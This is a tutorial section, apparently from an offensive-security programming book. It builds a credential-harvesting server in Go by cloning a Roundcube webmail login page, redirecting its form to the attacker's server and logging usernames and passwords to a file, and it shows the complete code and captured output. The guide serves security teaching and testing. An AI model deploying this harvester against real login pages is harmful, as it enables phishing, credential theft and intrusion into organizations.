## Credential Harvesting
One of the staples of social engineering is the `credential-harvesting attack`. This type of attack captures users’ login 
information to specific websites by getting them to enter their credentials in a cloned version of the original site. The 
attack is useful against organizations that expose a single-factor authentication interface to the internet. Once you have 
a user’s credentials, you can use them to access their account on the actual site. This often leads to an initial breach 
of the organization’s perimeter network.

Go provides a great platform for this type of attack, because it’s quick to stand up new servers, and because it makes 
it easy to configure routing and to parse user-supplied input. You could add many customizations and features to a 
credential-harvesting server, but for this example, let’s stick to the basics.

To begin, you need to clone a site that has a login form. There are a lot of possibilities here. In practice, you’d probably 
want to clone a site in use by the target. For this example, though, you’ll clone a `Roundcube` site. `Roundcube` is an 
open source webmail client that’s not used as often as commercial software, such as Microsoft Exchange, but will allow 
us to illustrate the concepts just as well. You’ll use Docker to run Roundcube, because it makes the process easier.

You can start a Roundcube server of your own by executing the following. If you don’t want to run a Roundcube server, 
then no worries; the exercise source code has a clone of the site. Still, we’re including this for completeness:
```shell script
$ docker run --rm -it -p 127.0.0.1:80:80 robbertkl/roundcube
```

The command starts a Roundcube Docker instance. If you navigate to `http://127.0.0.1:80`, you’ll be presented with a 
login form. Normally, you’d use wget to clone a site and all its requisite files, but Roundcube has JavaScript 
awesomeness that prevents this from working. Instead, you’ll use [Google Chrome Save All Resources plugin](https://chrome.google.com/webstore/detail/save-all-resources/abpdnfjocnmdomablahdcfnoggeeiedb/related) 
to save it. In the exercise folder, you should see a directory structure that looks like below:
```shell script
$ tree
.
+-- main.go
+-- public
   +-- index.html
   +-- index_files
       +-- app.js
       +-- common.js
       +-- jquery-ui-1.10.4.custom.css
       +-- jquery-ui-1.10.4.custom.min.js
       +-- jquery.min.js
       +-- jstz.min.js
       +-- roundcube_logo.png
       +-- styles.css
       +-- ui.js
    index.html
```
The files in the public directory represent the unaltered cloned login site. You’ll need to modify 
the original login form to redirect the entered credentials, sending them to yourself instead of 
the legitimate server. To begin, open [public/index.html](public/index.html) and find the form 
element used to `POST` the login request. It should look something like the following:
```xml
<form name="form" method="post" action="http://127.0.0.1/?_task=login">
```
You need to modify the action attribute of this tag and point it to your server. Change action to `/login`. 
Don’t forget to save it. The line should now look like the following:
```xml
<form name="form" method="post" action="/login">
```

To render the login form correctly and capture a username and password, you’ll first need to serve 
the files in the public directory. Then you’ll need to write a HandleFunc for `/login` to capture the 
username and password. You’ll also want to store the captured credentials in a file with some verbose 
logging.

You can handle all of this in just a few dozen lines of code. [main.go](main.go) shows the program in its 
entirety.
```go
package main

import (
    "net/http"
    "os"
    "time"

    log "github.com/Sirupsen/logrus" ❶
    "github.com/gorilla/mux"
)

func login(w http.ResponseWriter, r *http.Request) {
    log.WithFields(log.Fields{ ❷
        "time":       time.Now().String(),
        "username":   r.FormValue("_user"), ❸
        "password":   r.FormValue("_pass"), ❹
        "user-agent": r.UserAgent(),
        "ip_address": r.RemoteAddr,
    }).Info("login attempt")
    http.Redirect(w, r, "/", 302)
}

func main() {
    fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600) ❺
    if err != nil {
        panic(err)
    }
    defer fh.Close()
    log.SetOutput(fh) ❻
    r := mux.NewRouter()
    r.HandleFunc("/login", login).Methods("POST") ❼
    r.PathPrefix("/").Handler(http.FileServer(http.Dir("public"))) ❽
    log.Fatal(http.ListenAndServe(":8080", r))
}
```

The first thing worth noting is you import [github.com/Sirupsen/logrus](github.com/Sirupsen/logrus) ❶. 
This is a structured logging package that we prefer to use instead of the standard Go log package. 
It provides more configurable logging options for better error handling. To use this package, you’ll 
need to make sure you ran go get beforehand.

Next, you define the `login()` handler function. Hopefully, this pattern looks familiar. Inside this 
function, you use `log.WithFields()` to write out your captured data ❷. You display the current time, 
the user-agent, and IP address of the requester. You also call `FormValue(string)` to capture both 
the username (_user) ❸ and password (_pass) ❹ values that were submitted. You get these values from 
`index.html` and by locating the form input elements for each username and password. Your server 
needs to explicitly align with the names of the fields as they exist in the login form.

The following snippet, extracted from index.html, shows the relevant input items, with the element names 
in bold for clarity:
```xml
<td class="input"><input name="_user" id="rcmloginuser" required="required"
size="40" autocapitalize="off" autocomplete="off" type="text"></td>
<td class="input"><input name="_pass" id="rcmloginpwd" required="required"
size="40" autocapitalize="off" autocomplete="off" type="password"></td>
```

In your `main()` function, you begin by opening a file that’ll be used to store your captured data ❺. 
Then, you use `log.SetOutput(io.Writer)`, passing it the file handle you just created, to configure 
the logging package so that it’ll write its output to that file ❻. Next, you create a new router and 
mount the `login()` handler function ❼.

Prior to starting the server, you do one more thing that may look unfamiliar: you tell your router 
to serve static files from a directory ❽. That way, your Go server explicitly knows where your 
static files—images, JavaScript, HTML—live. Go makes this easy, and provides protections against 
directory traversal attacks. Starting from the inside out, you use `http.Dir(string)` to define the 
directory from which you wish to serve the files. The result of this is passed as input to 
`http.FileServer(FileSystem)`, which creates an `http.Handler` for your directory. You’ll mount this to your 
router by using `PathPrefix(string)`. Using / as a path prefix will match any request that hasn’t already found 
a match. Note that, by default, the handler returned from FileServer does support directory indexing. This could 
leak some information. It’s possible to disable this, but we won’t cover that here.

Finally, as you have before, you start the server. Once you’ve built and executed the code in [main.go](main.go), 
open your web browser and navigate to http://localhost:8080. Try submitting a username and password to the form. 
Then head back to the terminal, exit the program, and view the `credentials.txt` file, shown here:
```shell script
$ go build -o credential_harvester
$ ./credential_harvester
^C
$ cat credentials.txt
INFO[0038] login attempt
ip_address="127.0.0.1:34040" password="p@ssw0rd1!" time="2020-02-13
21:29:37.048572849 -0800 PST" user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64;
rv:51.0) Gecko/20100101 Firefox/51.0" username=bob
```

Look at those logs! You can see that you submitted the username of bob and the password of p@ssw0rd1!. Your 
malicious server successfully handled the form POST request, captured the entered credentials, and saved them to 
a file for offline viewing. As an attacker, you could then attempt to use these credentials against the target 
organization and proceed with further compromise.

In the next section, you’ll work through a variation of this credential-harvesting technique. `Instead of waiting for 
form submission, you’ll create a keylogger to capture keystrokes in real time.`